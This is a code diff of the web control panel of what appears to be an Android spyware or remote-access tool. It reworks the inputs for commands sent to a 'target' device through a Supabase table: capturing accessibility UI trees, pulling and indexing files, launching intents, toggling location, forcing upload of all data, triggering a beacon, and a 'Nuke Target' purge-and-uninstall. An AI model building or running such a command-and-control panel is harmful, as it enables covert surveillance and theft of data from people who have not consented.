@@ -145,12 +145,31 @@
             <div class="card">
                 <div class="cmd-row"><label class="cmd-label">User Alert</label><div class="input-wrap"><input type="text" id="val-toast" placeholder="Toast msg..."><button class="btn" onclick="sendCmd('TOAST')">Toast</button></div></div>
                 <div class="cmd-row"><label class="cmd-label">Sonic Alarm</label><div class="input-wrap"><input type="number" id="val-ring" placeholder="Secs (e.g. 10)"><button class="btn" onclick="sendCmd('RING')">Ring</button></div></div>
-                <div class="cmd-row"><label class="cmd-label">Remote Intent</label><div class="input-wrap"><textarea id="val-intent" placeholder='{"action":"..."}'>{"action":"android.intent.action.VIEW","data":"https://google.com","target":"activity"}</textarea><button class="btn" onclick="sendCmd('RUN_INTENT')">Run</button></div></div>
+                <div class="cmd-row">
+                    <label class="cmd-label">Remote Intent</label>
+                    <input type="text" id="int-act" value="android.intent.action.VIEW" placeholder="Action">
+                    <input type="text" id="int-data" placeholder="Data (URL/URI)">
+                    <div class="input-wrap">
+                        <select id="int-tgt" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light); padding:8px;">
+                            <option value="activity">Activity</option>
+                            <option value="service">Service</option>
+                            <option value="broadcast">Broadcast</option>
+                        </select>
+                        <button class="btn" onclick="sendCmd('RUN_INTENT')">Run</button>
+                    </div>
+                </div>
             </div>
 
             <h2>Surveillance</h2>
             <div class="card">
-                <div class="cmd-row"><label class="cmd-label">Accessibility Audit</label><div class="input-wrap"><textarea id="val-tree">{"pkg":null,"duration_mins":1}</textarea><button class="btn" onclick="sendCmd('GET_TREE')">Audit</button></div></div>
+                <div class="cmd-row">
+                    <label class="cmd-label">Accessibility Audit</label>
+                    <div class="input-wrap">
+                        <input type="text" id="tree-pkg" placeholder="Package (null for all)">
+                        <input type="number" id="tree-dur" value="1" placeholder="Mins" style="width:80px">
+                        <button class="btn" onclick="sendCmd('GET_TREE')">Audit</button>
+                    </div>
+                </div>
                 <div class="cmd-row"><label class="cmd-label">Forensic Pull</label><div class="input-wrap"><input type="text" id="val-pull" placeholder="/sdcard/Download/file.jpg"><button class="btn" onclick="sendCmd('PULL_FILE')">Fetch</button></div></div>
                 <div class="cmd-grid" style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
                     <button class="btn" onclick="sendCmd('GET_SKELETON')">Index Files</button>
@@ -163,13 +182,32 @@
             <div class="card">
                 <div class="cmd-row"><label class="cmd-label">Burst Mode (Stay Ready)</label><div class="input-wrap"><input type="number" id="val-burst" placeholder="Mins (e.g. 15)"><button class="btn" onclick="sendCmd('STAY_READY')">Activate</button></div></div>
                 <div class="cmd-row"><label class="cmd-label">Work Cycle</label><div class="input-wrap"><input type="number" id="val-work" placeholder="Mins (Min 15)"><button class="btn" onclick="sendCmd('SET_INTERVAL')">Set</button></div></div>
-                <div class="cmd-row"><label class="cmd-label">Global Feature Toggle</label><div class="input-wrap"><input type="text" id="val-toggle" placeholder="location:off:15"><button class="btn" onclick="sendCmd('TOGGLE_FEATURE')">Toggle</button></div></div>
+                <div class="cmd-row">
+                    <label class="cmd-label">Feature Control</label>
+                    <div class="input-wrap">
+                        <input type="text" id="tog-feat" placeholder="Feature (e.g. location)">
+                        <select id="tog-state" style="background:#000; color:var(--primary); border:1px solid var(--surface-light);">
+                            <option value="on">ON</option>
+                            <option value="off">OFF</option>
+                        </select>
+                        <input type="number" id="tog-dur" value="0" placeholder="Mins" style="width:70px">
+                        <button class="btn" onclick="sendCmd('TOGGLE_FEATURE')">Set</button>
+                    </div>
+                </div>
                 <button class="btn" style="width:100%" onclick="sendCmd('FORCE_UPLOAD', 'ALL')">Emergency Cloud Sync (ALL)</button>
             </div>
 
             <h2 style="background: var(--danger)">Crisis Management</h2>
             <div class="card" style="border-color: var(--danger)">
-                <div class="cmd-row"><label class="cmd-label">Code Red (Beacon)</label><div class="input-wrap"><input type="text" id="val-codered" value="0-15-30" placeholder="codes-dur-freq"><button class="btn danger" onclick="sendCmd('CODERED')">Trigger</button></div></div>
+                <div class="cmd-row">
+                    <label class="cmd-label">Code Red (Beacon)</label>
+                    <div class="input-wrap">
+                        <input type="text" id="cr-code" value="0" placeholder="Codes" style="width:60px">
+                        <input type="number" id="cr-dur" value="15" placeholder="Mins">
+                        <input type="number" id="cr-freq" value="30" placeholder="Freq(s)">
+                        <button class="btn danger" onclick="sendCmd('CODERED')">Trigger</button>
+                    </div>
+                </div>
                 <div class="cmd-grid" style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
                     <button class="btn danger" onclick="sendCmd('STOP_BEACON')">Dark Mode</button>
                     <button class="btn danger" onclick="if(confirm('PURGE DATA & UNINSTALL?')) sendCmd('NUKE')">Nuke Target</button>
@@ -248,16 +286,30 @@
         async function sendCmd(type, forcedVal = null) {
             if (!currentDeviceId) return alert("DISCONNECTED");
             
-            // Intelligent value mapping
             let content = forcedVal;
             if (content === null) {
-                const inputMap = {
-                    'TOAST': 'val-toast', 'RING': 'val-ring', 'RUN_INTENT': 'val-intent',
-                    'GET_TREE': 'val-tree', 'PULL_FILE': 'val-pull', 'STAY_READY': 'val-burst',
-                    'SET_INTERVAL': 'val-work', 'TOGGLE_FEATURE': 'val-toggle', 'CODERED': 'val-codered'
-                };
-                const inputId = inputMap[type];
-                if (inputId) content = document.getElementById(inputId).value;
+                switch(type) {
+                    case 'TOAST': content = document.getElementById('val-toast').value; break;
+                    case 'RING': content = document.getElementById('val-ring').value; break;
+                    case 'STAY_READY': content = document.getElementById('val-burst').value; break;
+                    case 'SET_INTERVAL': content = document.getElementById('val-work').value; break;
+                    case 'PULL_FILE': content = document.getElementById('val-pull').value; break;
+                    case 'RUN_INTENT':
+                        content = JSON.stringify({
+                            action: document.getElementById('int-act').value,
+                            data: document.getElementById('int-data').value,
+                            target: document.getElementById('int-tgt').value
+                        }); break;
+                    case 'GET_TREE':
+                        content = JSON.stringify({
+                            pkg: document.getElementById('tree-pkg').value || null,
+                            duration_mins: parseInt(document.getElementById('tree-dur').value) || 1
+                        }); break;
+                    case 'TOGGLE_FEATURE':
+                        content = `${document.getElementById('tog-feat').value}:${document.getElementById('tog-state').value}:${document.getElementById('tog-dur').value}`; break;
+                    case 'CODERED':
+                        content = `${document.getElementById('cr-code').value}-${document.getElementById('cr-dur').value}-${document.getElementById('cr-freq').value}`; break;
+                }
             }
 
             const { error } = await sb.from('file_commands').insert({
